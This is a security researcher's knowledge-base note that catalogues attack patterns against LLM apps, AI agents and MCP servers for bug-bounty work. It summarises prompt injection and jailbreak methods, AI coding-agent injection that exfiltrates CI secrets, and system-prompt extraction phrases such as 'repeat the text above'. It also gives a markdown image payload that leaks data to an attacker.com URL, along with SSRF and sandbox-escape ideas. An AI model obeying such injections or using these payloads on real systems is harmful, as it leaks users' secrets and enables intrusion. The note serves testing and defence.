---
type: pattern
title: Pattern - AI / LLM / MCP Security
tags: [pattern, llm, mcp, prompt-injection, oauth-scope-mismatch, indirect-injection, emerging-attack-surface, bb-pattern]
status: active
category: emerging
severity_range: P1-P5
last_updated: 2026-04-28
---

# Pattern: AI / LLM / MCP Security

> **Emerging attack-surface cluster** — consolidates scattered AI/LLM/MCP findings into a single Pattern hub for tracking new attack vectors as they appear. Maps to the OWASP LLM Top 10 and the newer category of MCP server security.

---

## Covered Attack Categories

### 1. Prompt Injection

- **Direct**: the user feeds a prompt straight to the LLM to manipulate its behavior.
- **Indirect**: instructions are planted in external content (a web page, document, or email) and fire when the LLM processes that content.
- **Jailbreak**: bypassing system-prompt restrictions (role-play, character encoding, token splitting).
- **OWASP LLM01**: the standard classification for the above.
- **AI Agent CI Injection (newer category)**: a PR title, issue comment, or HTML comment carries an injected instruction that an AI coding agent follows, exfiltrating CI runner secrets — typically base64-encoded and smuggled out via a commit or PR comment. Documented across multiple AI coding agents (Claude Code, Gemini CLI, GitHub Copilot Agent) in academic research; mitigations include enforcing an allowed-tools list, filtering environment variables at every layer, and base64-aware secret scanning.

### 2. LLM Insecure Output Handling (OWASP LLM02)

Unfiltered LLM output flows into a downstream sink:
- LLM output → `eval()` / `exec()` → **RCE**
- LLM output → SQL query → **SQL injection**
- LLM output → rendered HTML → **XSS**
- LLM output → `fetch(URL)` → **SSRF**
- LLM output → file write → **path traversal**

### 3. MCP (Model Context Protocol) Server Security

A newer protocol that saw broad adoption starting in late 2025 — the attack surface is still emerging:

- **OAuth Scope Mismatch**: the OAuth scope an MCP server receives doesn't line up with what its tools actually allow. Watch for MCP servers that request broad scopes (e.g. full inbox read/write) but expose only a narrow tool surface, or vice versa — a mismatch either over-privileges the token or silently grants more than the UI implies.
- **Tool Injection / Read-tool Prompt Injection**: if the content an MCP `read_tool` returns is attacker-controlled, the LLM may treat it as an instruction rather than data.
- **BOLA via MCP Proxy**: when an MCP server acts as a backend proxy, classic IDOR/BOLA patterns apply to the proxied resources.

### 4. ASCII Smuggling / Data Exfiltration via LLM

Abuses how LLMs render markdown to leak data through an image or link egress:
- A fake image `![data](https://attacker.com/?leak=<sensitive>)` that the browser auto-fetches.
- ASCII tag smuggling (invisible Unicode characters that bypass sanitization).
- LLM output containing special control sequences that trigger terminal injection.

### 5. System Prompt Extraction

- Coaxing the model to reveal its system prompt ("repeat the text above", "what's in your context").
- Exposing internal design details, tool schemas, or API-key hints embedded in the prompt.

### 6. RCE via Code-Capable Tools

When an LLM has a code-interpreter or shell tool:
- Guiding the LLM into writing and executing malicious code.
- Sandbox escape (e.g. Pyodide, browser-side sandboxes).
- Using the LLM's file-write capability to plant a cron job or startup script.

### 7. ASI01–ASI10 (Agentic AI Security Framework)

A newer framework covering the trust boundaries of autonomous agents: tool use, memory poisoning, and multi-agent collusion.

---

## Tools / Scanners

| Tool | Purpose | Source |
|---|---|---|
| **PromptMap** | LLM prompt-injection scanner | OSS |
| **Garak** | LLM vulnerability scanner (generative-AI red teaming) | NVIDIA |

---

## Why This Pattern Matters

1. Major platforms (Anthropic, OpenAI, Salesforce, GitHub Copilot, and others) have adopted MCP at scale — the attack surface is expanding fast.
2. The OWASP LLM Top 10 is now formally published, and bug bounty programs have started accepting reports against it.
3. Agentic AI = LLM + tools + memory + autonomous decisions — every additional tool is another attack vector.
4. Prompt injection is cross-cutting: it's not limited to chatbots — any LLM-touched workflow (PR review, customer support, agent orchestration) is affected.

---

## Relationship to Other Patterns

- [[Pattern - Indirect Prompt Injection via External Data Sources]] — the indirect-injection sub-pattern in depth.
- [[Pattern - IDOR]] — the reasoning behind MCP-proxy BOLA follows the same differential-response oracle logic.
- [[Pattern - SSRF]] — LLM output that triggers a `fetch()` shares the same attack surface as classic SSRF.
- [[Pattern - GraphQL]] — LLM tool-schema enumeration is conceptually the same as GraphQL field-suggestion enumeration.

## Related

- [[Pattern - IDOR]]
- [[Pattern - SSRF]]
- [[Pattern - Indirect Prompt Injection via External Data Sources]]
- [[Lessons Learned]]

## Session-Mined Additions

- **Observability endpoint as SSRF discovery**: unauthenticated `/metrics`, `/health`, `/jobs` endpoints can leak a Redis `IP:Port` plus a job UUID — escalate directly into an SSRF attack path (GET the metrics endpoint to obtain the Redis IP, then try a `dict://` SSRF against it).
- **System prompt leakage via admin reload**: an unauthenticated admin-style endpoint (e.g. `/skills/v1/reload`) can leak the entire system prompt plus tool schema. Test by issuing a GET with no auth and checking whether the response contains prompt structure.
- **AI endpoint auth gap**: session/memory/history endpoints on an AI platform are often added after the core product's auth review and are the most commonly overlooked surface.
